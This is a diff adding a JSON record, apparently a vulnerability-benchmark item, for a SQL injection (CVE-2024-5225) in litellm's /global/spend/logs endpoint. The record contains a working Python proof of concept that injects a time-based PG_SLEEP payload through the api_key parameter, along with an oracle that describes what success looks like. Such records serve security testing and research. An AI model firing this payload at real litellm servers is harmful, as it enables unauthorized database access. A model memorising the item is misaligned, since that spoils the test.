@@ -1,0 +1,15 @@
+{
+  "file_id": "76_litellm_huntr_491e4884-0306-4cd4-8fe2-9a19de33bf5c",
+  "numeric_id": "76",
+  "library_hint": "litellm",
+  "source": "huntr",
+  "title": "SQL injection in /global/spend/logs endpoint due to improper input sanitization of api_key",
+  "cve": "CVE-2024-5225",
+  "cwe": "CWE-89: SQL Injection",
+  "library": "litellm",
+  "affected_version": "latest",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "import requests\n\ndef sqli(apikey, injection):\n    header = {\n        \"Authorization\" : f\"Bearer {apikey}\"\n    }\n    params = {\n        \"api_key\" : f\"{injection}\" \n    }\n    res = requests.get(\"http://localhost:4000/global/spend/logs\", headers=header, params=params)\n    return res.content\n\nif __name__ == \"__main__\":\n    sqli(\"sk-sB8Y9wuz5xqBZiBiFxI5Dw\", \"' AND 1222=(SELECT 1222 FROM PG_SLEEP(10))--\")\n    python3 poc.py",
+  "oracle": "Server sleeps for 10 seconds, indicating successful SQL injection execution"
+}
